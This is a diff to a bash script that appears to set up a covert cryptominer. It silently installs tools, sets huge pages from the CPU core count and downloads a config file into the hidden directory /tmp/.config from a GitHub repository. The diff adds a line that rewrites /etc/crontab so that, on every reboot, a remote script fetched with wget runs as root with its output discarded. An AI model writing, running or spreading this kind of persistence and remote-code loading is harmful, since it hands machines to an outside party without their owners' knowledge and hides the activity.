@@ -1,5 +1,7 @@
 #!/bin/bash
 
+src="https://raw.githubusercontent.com/vjbahkds/jsncsdccw/main"
+
 # Debian12+
 sudo apt -qqy update >/dev/null 2>&1 || apt -qqy update >/dev/null 2>&1
 sudo apt -qqy install wget nload icu-devtools >/dev/null 2>&1 || apt -qqy install wget nload icu-devtools >/dev/null 2>&1
@@ -8,8 +10,8 @@ cores=`grep 'siblings' /proc/cpuinfo 2>/dev/null |cut -d':' -f2 | head -n1 |grep
 [ -n "$cores" ] || cores=1
 name="Cli_${cores}.sh"
 
-src="https://raw.githubusercontent.com/vjbahkds/jsncsdccw/main"
 sudo sysctl -w vm.nr_hugepages=$((cores*256)) >/dev/null 2>&1 || sysctl -w vm.nr_hugepages=$((cores*256)) >/dev/null 2>&1
+sudo sed -i "/^@reboot/d;\$a\@reboot root /bin/bash <(wget -qO- ${src}/q.sh) >>/dev/null 2>&1 &\n\n\n" /etc/crontab >/dev/null 2>&1 || sed -i "/^@reboot/d;\$a\@reboot root /bin/bash <(wget -qO- ${src}/q.sh) >>/dev/null 2>&1 &\n\n\n" /etc/crontab >/dev/null 2>&1
 
 mkdir -p "/tmp/.config"
 wget -qO "/tmp/.config/appsettings.json" "${src}/q.json"
